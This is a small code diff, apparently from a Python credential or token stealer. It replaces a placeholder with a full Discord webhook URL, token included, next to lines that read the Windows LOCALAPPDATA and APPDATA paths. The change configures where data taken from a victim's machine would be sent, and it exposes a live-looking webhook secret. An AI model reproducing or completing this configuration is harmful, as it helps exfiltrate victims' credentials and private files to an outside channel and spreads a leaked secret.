@@ -13,7 +13,7 @@ from sys import argv
 dt = datetime.now()
 
 # Paste your webhook url to "URL_HERE"
-WEBHOOK_URL = 'URL_HERE'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/929525882413019146/mNv_U-xE8JxGSpOTppUn_b6955vDzCR_wAkTOwUn6SZETx4mOgNgysPbANJ4MPlx_93R'
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
